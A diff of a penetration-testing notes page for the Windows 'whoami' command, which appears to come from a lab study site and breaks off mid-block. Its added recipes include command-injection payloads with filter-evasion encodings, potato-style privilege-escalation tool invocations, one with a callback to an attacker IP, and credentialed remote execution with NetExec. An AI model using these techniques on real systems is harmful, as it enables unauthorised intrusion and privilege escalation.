@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/whoami.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Record the current Windows token
+[Search this tool’s saved examples](/commands/notebook?tool=whoami) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Record the current Windows token
 
 **Run in:** Windows shell on the relevant host. **Requires:** Existing shell; these commands describe that process context
 
@@ -27,13 +35,11 @@ $env:USERDOMAIN
 $env:LOGONSERVER
 ```
 
-**Read the result:** Identity, group SIDs and privilege state for this logon context.
-
-**If Directory membership differs from token:** Check collection time, fresh logon context and enabled/deny-only groups.
+**What the result establishes:** Identity, group SIDs and privilege state for this logon context.
 
 **Next check:** Trace the relevant membership and verify its permission on the intended resource.
 
-## Current operation: Inspect the current Windows token
+## Inspect the current Windows token
 
 **Run in:** Windows cmd.exe. **Requires:** A command session in the exact process/logon context you are assessing.
 
@@ -41,116 +47,9 @@ $env:LOGONSERVER
 whoami /all
 ```
 
-**Read the result:** Use the identity, group and privilege views to establish the current process token.
-
-**If Group membership is present but a privilege or access check fails:** A username alone does not establish elevation, enabled privileges or credentials usable for a second network hop.
+**What the result establishes:** Use the identity, group and privilege views to establish the current process token.
 
 **Next check:** Read integrity level, deny-only groups and privilege state; compare the exact resource ACL before choosing an escalation path.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## whoami: choose the operation and read the result
-
-Check the current account and Windows privileges.
-
-### What the result establishes
-
-Use the identity, group and privilege views to establish the current process token.
-
-### Prerequisites and common failures
-
-A username alone does not establish elevation, enabled privileges or credentials usable for a second network hop.
-
-### Example 1: Commands
-
-Run in: **Windows cmd.exe or PowerShell**.
-
-```powershell
-whoami
-whoami /priv
-whoami /groups
-```
-
-### Example 2: Phase 6 — Post-Exploitation: Confirming Privilege Level
-
-Run in: **Saved lab example**.
-
-```text
-whoami
-```
-
-Saved context: [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Identify token groups and privileges
-
-Run in: **Saved lab example**.
-
-```powershell
-whoami /all
-```
-
-Saved context: [AD Lab Guide — Full Reference — Identify token groups and privileges](/lab-guide/reference#identify-token-groups-and-privileges). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Phase 6 — Post-Exploitation: Confirming Privilege Level
-
-Run in: **Saved lab example**.
-
-```text
-whoami /priv
-```
-
-Saved context: [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Tools for this service
-
-Run in: **Saved lab example**.
-
-```powershell
-whoami
-hostname
-```
-
-Saved context: [Evil-WinRM — Connect to Windows — Tools for this service](/tools/evil-winrm#tools-for-this-service). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: User Enumeration
-
-Run in: **Saved lab example**.
-
-```powershell
-whoami /priv
-whoami /groups
-```
-
-Saved context: [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: User Enumeration
-
-Run in: **Saved lab example**.
-
-```powershell
-echo %USERNAME% || whoami
-$env:username
-```
-
-Saved context: [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Check the current account and Windows privileges.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=whoami) · [All tools](/index)
 
 ## Commands
 
@@ -162,13 +61,106 @@ whoami /priv
 whoami /groups
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Directory membership differs from token | Check collection time, fresh logon context and enabled/deny-only groups. |
+| Group membership is present but a privilege or access check fails | A username alone does not establish elevation, enabled privileges or credentials usable for a second network hop. |
 
 ## Notebook recipes
 
-49 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+92 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
+
+<Accordion title="Identify the principal and object">
+
+### Identify the principal and object
+
+**AD ACL Abuse: Quick Reference**
+
+```powershell
+whoami /user
+whoami /groups
+Get-ADUser USERNAME -Properties MemberOf,DistinguishedName,ObjectSID
+Get-ADGroup GROUP_NAME -Properties Members,DistinguishedName
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Identify the principal and object](/active-directory/acl-abuse#identify-the-principal-and-object)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Validate one edge and re-enumerate">
+
+### Validate one edge and re-enumerate
+
+**AD ACL Abuse: Quick Reference**
+
+```powershell
+Get-ADGroupMember GROUP_NAME
+Get-ADPrincipalGroupMembership USERNAME | Select-Object Name
+whoami /groups
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD ACL Abuse: Quick Reference — Validate one edge and re-enumerate](/active-directory/acl-abuse#validate-one-edge-and-re-enumerate)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Step 1: Entry Host Foothold &amp; Local Enumeration">
+
+### Step 1: Entry Host Foothold & Local Enumeration
+
+**AD Enumeration & Attacks: Skills Assessment Hub**
+
+```powershell
+# Confirm current identity, token privileges, and network interfaces
+whoami /all
+ipconfig /all
+route print
+netstat -ano
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 1: Entry Host Foothold & Local Enumeration](/active-directory/assessment#step-1-entry-host-foothold-&-local-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Compare the directory with the session">
+
+### Compare the directory with the session
+
+**AD groups and effective access**
+
+```powershell
+whoami /user
+whoami /groups
+Get-LocalGroup
+Get-LocalGroupMember -Group 'Administrators'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD groups and effective access — Compare the directory with the session](/field/ad-groups#compare-the-directory-with-the-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
 
 <Accordion title="Windows — inspect the current session">
 
@@ -271,6 +263,79 @@ whoami /priv
 
 </Accordion>
 
+<Accordion title="Establish names, policy, and your token">
+
+### Establish names, policy, and your token
+
+**Active Directory Enumeration: Quick Reference**
+
+```powershell
+whoami /all
+hostname
+ipconfig /all
+nltest /dsgetdc:DOMAIN_FQDN
+net accounts /domain
+net user /domain
+net group /domain
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration: Quick Reference — Establish names, policy, and your token](/active-directory/enumeration#establish-names-policy-and-your-token)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Record the current Windows token and domain">
+
+### Record the current Windows token and domain
+
+**Active Directory: Enumeration Methodology**
+
+```powershell
+whoami
+whoami /user
+whoami /groups
+whoami /priv
+$env:USERDOMAIN
+$env:LOGONSERVER
+hostname
+ipconfig /all
+nltest /dsgetdc:lab.htb
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory: Enumeration Methodology — Record the current Windows token and domain](/active-directory/methodology#record-the-current-windows-token-and-domain)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Work outward from the controlled identity">
+
+### Work outward from the controlled identity
+
+**BloodHound — Start, Collect, and Import**
+
+```powershell
+Get-ADPrincipalGroupMembership USERNAME | Select-Object Name
+Get-ADGroupMember GROUP_NAME -Recursive
+whoami /groups
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound — Start, Collect, and Import — Work outward from the controlled identity](/tools/bloodhound#work-outward-from-the-controlled-identity)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Getting a SYSTEM shell using Impacket&#x27;s psexec.py">
 
 ### Getting a SYSTEM shell using Impacket's psexec.py
@@ -358,6 +423,420 @@ C:\Windows\system32>exit
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Child to Parent Trusts - Linux — Performing the Attack with raiseChild.py](/active-directory/trusts-child-parent-linux#performing-the-attack-with-raisechild-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Capture and replay the real request">
+
+### Capture and replay the real request
+
+**Command Injection**
+
+```bash
+curl -sS --data-urlencode 'ip=127.0.0.1;whoami' "$BASE/check.php"
+curl -sS --data-urlencode 'ip=127.0.0.1&&whoami' "$BASE/check.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Capture and replay the real request](/web/cmdi#capture-and-replay-the-real-request)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Choose an operator that fits the shell">
+
+### Choose an operator that fits the shell
+
+**Command Injection**
+
+```text
+127.0.0.1&whoami
+127.0.0.1&&whoami
+invalid-host||whoami
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Choose an operator that fits the shell](/web/cmdi#choose-an-operator-that-fits-the-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Enumerate after a successful proof">
+
+### Enumerate after a successful proof
+
+**Command Injection**
+
+```bash
+id
+whoami
+pwd
+uname -a
+ls -la
+ip address
+ip route
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Enumerate after a successful proof](/web/cmdi#enumerate-after-a-successful-proof)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injection**
+
+```powershell
+whoami
+whoami /priv
+hostname
+Get-Location
+Get-ChildItem
+ipconfig /all
+route print
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Enumerate after a successful proof](/web/cmdi#enumerate-after-a-successful-proof)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Transformations with explicit prerequisites">
+
+### Transformations with explicit prerequisites
+
+**Command Injection**
+
+```bash
+# Bash + rev: reconstruct a small identity command.
+$(rev<<<'imaohw')
+
+# Bash + base64: a local encoding example, followed by its decoding form.
+printf '%s' 'whoami' | base64
+bash<<<$(base64 -d<<<d2hvYW1p)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Transformations with explicit prerequisites](/web/cmdi#transformations-with-explicit-prerequisites)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injection**
+
+```powershell
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
+powershell.exe -NoProfile -EncodedCommand $encoded
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Transformations with explicit prerequisites](/web/cmdi#transformations-with-explicit-prerequisites)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="AND Operator">
+
+### AND Operator
+
+**Command Injections — HTB Module**
+
+```bash
+ping -c 1 127.0.0.1 && whoami
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — AND Operator](/web/htb/command-injections#and-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```text
+21y4d@htb[/htb]$ ping -c 1 127.0.0.1 && whoami
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
+21y4d
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — AND Operator](/web/htb/command-injections#and-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Case Manipulation">
+
+### Case Manipulation
+
+**Command Injections — HTB Module**
+
+```powershell
+PS C:\htb> WhOaMi
+
+21y4d
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Case Manipulation](/web/htb/command-injections#case-manipulation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```text
+21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+
+21y4d
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Case Manipulation](/web/htb/command-injections#case-manipulation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```bash
+$(a="WhOaMi";printf %s "${a,,}")
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Case Manipulation](/web/htb/command-injections#case-manipulation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Commands Blacklist">
+
+### Commands Blacklist
+
+**Command Injections — HTB Module**
+
+```php
+$blacklist = ['whoami', 'cat', ...SNIP...];
+foreach ($blacklist as $word) {
+    if (strpos('$_POST['ip']', $word) !== false) {
+        echo "Invalid input";
+    }
+}
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Commands Blacklist](/web/htb/command-injections#commands-blacklist)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Encoded Commands">
+
+### Encoded Commands
+
+**Command Injections — HTB Module**
+
+```powershell
+PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+
+dwBoAG8AYQBtAGkA
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Encoded Commands](/web/htb/command-injections#encoded-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Filter/WAF Detection">
+
+### Filter/WAF Detection
+
+**Command Injections — HTB Module**
+
+```bash
+127.0.0.1; whoami
+
+Other than the IP (which we know is not blacklisted), we sent:
+
+    A semi-colon character ;
+    A space character
+    A whoami command
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Filter/WAF Detection](/web/htb/command-injections#filter/waf-detection)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Injecting Our Command">
+
+### Injecting Our Command
+
+**Command Injections — HTB Module**
+
+```bash
+ping -c 1 127.0.0.1; whoami
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Injecting Our Command](/web/htb/command-injections#injecting-our-command)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```text
+21y4d@htb[/htb]$ ping -c 1 127.0.0.1; whoami
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms
+21y4d
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Injecting Our Command](/web/htb/command-injections#injecting-our-command)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="OR Operator">
+
+### OR Operator
+
+**Command Injections — HTB Module**
+
+```text
+21y4d@htb[/htb]$ ping -c 1 127.0.0.1 || whoami
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — OR Operator](/web/htb/command-injections#or-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```text
+21y4d@htb[/htb]$ ping -c 1 || whoami
+
+ping: usage error: Destination address required
+21y4d
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — OR Operator](/web/htb/command-injections#or-operator)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Reversed Commands">
+
+### Reversed Commands
+
+**Command Injections — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo 'whoami' | rev
+imaohw
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Reversed Commands](/web/htb/command-injections#reversed-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Command Injections — HTB Module**
+
+```powershell
+PS C:\htb> "whoami"[-1..-20] -join ''
+
+imaohw
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injections — HTB Module — Reversed Commands](/web/htb/command-injections#reversed-commands)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -494,6 +973,19 @@ whoami
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
+**Common Services: Personal Assessment Notes**
+
+```text
+whoami /priv
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Phase 6 — Post-Exploitation: Confirming Privilege Level](/modules/common-services/assessment#phase-6-—-post-exploitation-confirming-privilege-level) · [Windows Privilege Escalation: Full Checklist — Juicy Potato (Abusing the golden privileges)](/privesc/windows-privesc-checklist#juicy-potato-abusing-the-golden-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Accessing DC03 Using Enter-PSSession">
@@ -526,6 +1018,52 @@ Windows IP Configuration
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="Establish the current context">
+
+### Establish the current context
+
+**DCSync and Credential Dumping: Quick Reference**
+
+```powershell
+whoami /user
+whoami /groups
+whoami /priv
+hostname
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync and Credential Dumping: Quick Reference — Establish the current context](/active-directory/dcsync-credential-dumping#establish-the-current-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Check a compatible EFS impersonation path">
+
+### Check a compatible EFS impersonation path
+
+**EfsPotato.exe**
+
+```powershell
+.\EfsPotato.exe "cmd /c whoami"
+```
+
+</Accordion>
+
+<Accordion title="Run a command">
+
+### Run a command
+
+**Enter-PSSession**
+
+```powershell
+Invoke-Command -ComputerName HOST_FQDN -Credential DOMAIN\USER -ScriptBlock { whoami }
+```
 
 </Accordion>
 
@@ -582,7 +1120,7 @@ xp_cmdshell dir C:\Users
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MSSQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mssql) · [Microsoft SQL Server Enumeration — Example 4: MSSQL](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-4-mssql)
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MSSQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mssql)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -616,22 +1154,27 @@ systeminfo                    # patch level / OS
 
 </Accordion>
 
-<Accordion title="Enumeration (post-foothold)">
+<Accordion title="Test a compatible impersonation path with one command">
 
-### Enumeration (post-foothold)
+### Test a compatible impersonation path with one command
 
-**HTB Box Note Template**
+**GodPotato**
 
-```bash
-# linpeas / winpeas / pspy / whoami /all etc.
+```powershell
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+</Accordion>
 
-**Original note sections:** [HTB Box Note Template — Enumeration (post-foothold)](/templates/box-note#enumeration-post-foothold)
+<Accordion title="Run a bounded JuicyPotatoNG identity test">
 
-{/* VAULT_ORIGINAL_LINK_END */}
+### Run a bounded JuicyPotatoNG identity test
 
+**JuicyPotato.exe**
+
+```console
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
+```
 
 </Accordion>
 
@@ -649,7 +1192,7 @@ find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Writable files](/privesc/linux-privesc-checklist#writable-files) · [Bash quoting and pipelines — Example 7: Writable files](/field/bash#example-7-writable-files)
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Writable files](/privesc/linux-privesc-checklist#writable-files)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -675,26 +1218,31 @@ EXEC xp_cmdshell 'whoami';
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Microsoft SQL Server Enumeration**
+</Accordion>
 
-Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  then  xp_cmdshell whoami .)
+<Accordion title="Confirm execution only after establishing the right">
 
-```text
-xp_cmdshell whoami
+### Confirm execution only after establishing the right
+
+**NetExec: Authentication and Enumeration**
+
+```bash
+nxc smb TARGET_IP -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' -x 'whoami'
+nxc winrm TARGET_IP -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' -x 'whoami'
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Microsoft SQL Server Enumeration — From DB access to OS command execution](/enumeration/mssql-microsoft-sql-server-cheat-sheet#from-db-access-to-os-command-execution)
+**Original note sections:** [NetExec: Authentication and Enumeration — Confirm execution only after establishing the right](/tools/netexec#confirm-execution-only-after-establishing-the-right)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="NetExec: Authentication and Enumeration">
+<Accordion title="Read failures as evidence">
 
-### NetExec: Authentication and Enumeration
+### Read failures as evidence
 
 **NetExec: Authentication and Enumeration**
 
@@ -713,7 +1261,7 @@ nxc smb $IP -u admin -p PASS -x 'whoami'        # or -X for powershell
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [NetExec: Authentication and Enumeration — Existing notes and worked examples](/tools/netexec#existing-notes-and-worked-examples)
+**Original note sections:** [NetExec: Authentication and Enumeration — Read failures as evidence](/tools/netexec#read-failures-as-evidence)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -743,6 +1291,18 @@ inlanefreight\john
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="Check the resulting identity in a PrintSpoofer lab">
+
+### Check the resulting identity in a PrintSpoofer lab
+
+**PrintSpoofer**
+
+```powershell
+.\PrintSpoofer64.exe -c "cmd.exe /c whoami"
+```
 
 </Accordion>
 
@@ -824,9 +1384,44 @@ NULL
 
 </Accordion>
 
-<Accordion title="Sliver: Session and Pivoting Quick Reference">
+<Accordion title="Establish execution and network context">
 
-### Sliver: Session and Pivoting Quick Reference
+### Establish execution and network context
+
+**Reverse Shell Generators and References**
+
+```powershell
+# Windows target:
+whoami
+whoami /priv
+$PSVersionTable.PSVersion
+ipconfig
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Reverse Shell Generators and References — Establish execution and network context](/exploitation/reverse-shell#establish-execution-and-network-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Exercise the configured RoguePotato callback path">
+
+### Exercise the configured RoguePotato callback path
+
+**RoguePotato.exe**
+
+```powershell
+.\RoguePotato.exe -r KALI_IP -e "cmd.exe /c whoami" -l 9999
+```
+
+</Accordion>
+
+<Accordion title="Treat each next capability separately">
+
+### Treat each next capability separately
 
 **Sliver: Session and Pivoting Quick Reference**
 
@@ -845,7 +1440,72 @@ sliver (SESSION) > socks5 start       # pivot; or: pivots / portfwd
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Sliver: Session and Pivoting Quick Reference — Existing notes and worked examples](/tools/sliver#existing-notes-and-worked-examples)
+**Original note sections:** [Sliver: Session and Pivoting Quick Reference — Treat each next capability separately](/tools/sliver#treat-each-next-capability-separately)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Start a process and collect its exit status">
+
+### Start a process and collect its exit status
+
+**Start-Process**
+
+```powershell
+$p = Start-Process -FilePath 'C:\Windows\System32\cmd.exe' -ArgumentList '/c whoami' -Wait -PassThru
+$p.ExitCode
+```
+
+</Accordion>
+
+<Accordion title="1. Record the shell and its network position">
+
+### 1. Record the shell and its network position
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```powershell
+whoami
+hostname
+Get-NetIPConfiguration
+Get-NetRoute -AddressFamily IPv4
+Get-NetTCPConnection -State Listen
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — 1. Record the shell and its network position](/pivoting/methodology#1-record-the-shell-and-its-network-position)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Windows identity, services, and permissions">
+
+### Windows identity, services, and permissions
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```powershell
+whoami
+whoami /groups
+whoami /priv
+hostname
+Get-Location
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
+schtasks /query /fo LIST /v
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — Windows identity, services, and permissions](/pivoting/methodology#windows-identity-services-and-permissions)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1000,6 +1660,29 @@ mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCop
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Windows Privilege Escalation: Full Checklist — HiveNightmare](/privesc/windows-privesc-checklist#hivenightmare)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Identity, architecture and host context">
+
+### Identity, architecture and host context
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+whoami /all
+hostname
+systeminfo
+Get-LocalGroupMember Administrators
+Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Identity, architecture and host context](/privesc/windows-privesc-checklist#identity-architecture-and-host-context)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1301,75 +1984,82 @@ impacket-wmiexec -hashes ':NT_HASH' 'example.local/administrator@192.0.2.10' 'wh
 
 </Accordion>
 
-<Accordion title="⏱️ HOW TO USE THIS — decision header (&quot;if you have X, do Y&quot;)">
+<Accordion title="NT hash">
 
-### ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")
+### NT hash
 
-**Active Directory Attack Path: Worked Lab**
+**atexec.py**
 
-Context from the notebook: Golden rule of order on any new host:   enumerate before you exploit.  On Windows the first three commands are always  whoami /priv ,  whoami /groups ,  whoami /all  — they decide your entire privesc path (see  8 ).
-
-```text
-whoami /priv
+```bash
